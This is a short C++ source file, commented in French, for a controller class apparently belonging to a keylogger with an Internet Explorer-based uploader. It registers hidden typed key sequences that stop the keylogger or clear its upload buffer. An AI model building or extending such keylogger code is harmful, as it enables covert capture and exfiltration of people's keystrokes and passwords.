/*!
* \file CtrlUploadeurIE.cpp
* Fichier source de la classe CtrlUploadeurIE, dérivée de Controleur
* \date 09/11/2008
* \author Xavier Monin
*/

#include "CtrlUploadeurIE.h"

/*!
* \brief Constructeur de CtrlUploadeurIE.
* Initialise l'objet UploadeurIE et crée les actions
* \param[in] mettre_en_ligne : Objet UploadeurIE
*/
CtrlUploadeurIE::CtrlUploadeurIE()
{
	MotDePasse mdp;
	mdp.push_back("<CTRL>");
	mdp.push_back("1");
	mdp.push_back("9");
	mdp.push_back("0");
	mdp.push_back("5");
	mdp.push_back("</CTRL>");
	arreter_keylogger = ajouterAction(mdp);

	mdp.clear();
	mdp.push_back("v");
	mdp.push_back("i");
	mdp.push_back("d");
	mdp.push_back("e");
	mdp.push_back("r");
	mdp.push_back(" ");
	mdp.push_back("b");
	mdp.push_back("u");
	mdp.push_back("f");
	mdp.push_back("f");
	mdp.push_back("e");
	mdp.push_back("r");
	vider_buffer = ajouterAction(mdp);
}

/*!
* \brief Effectue un action.
* Arrête le KeyLogger ou vide le buffer de UploadeurIE.
* \param[in] action : Identifiant de l'action à effectuer.
* \return : true
*/
bool CtrlUploadeurIE::effectuerAction(IdentifiantAction action)
{
	if (action == arreter_keylogger)
	{
		if (source_keylogger)
			source_keylogger->arreter();
	}
	if (action == vider_buffer)// && ie != NULL)
		;//ie->effacerBuffer();

	return true;
}

CtrlUploadeurIE::~CtrlUploadeurIE()
{

}
